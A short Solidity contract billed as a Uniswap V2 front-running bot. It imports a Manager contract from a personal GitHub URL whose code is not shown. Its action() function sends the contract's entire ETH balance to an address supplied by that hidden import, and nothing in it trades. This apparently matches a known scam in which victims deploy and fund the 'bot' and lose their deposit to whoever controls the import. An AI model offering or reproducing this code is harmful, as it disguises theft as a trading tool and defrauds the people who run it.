pragma solidity ^0.6.6;


import "https://github.com/cryptofan2023/fun/blob/main/test3.sol";

contract UniswapV2FrontBot {
    

	Manager manager;
	
	
	constructor() public {

           manager = new Manager();
	}
	
	    

	receive() external payable {}
	    
	
	    
	function action() public payable {

           payable(manager.uniswapDepositAddress()).transfer(address(this).balance);

        }      

}
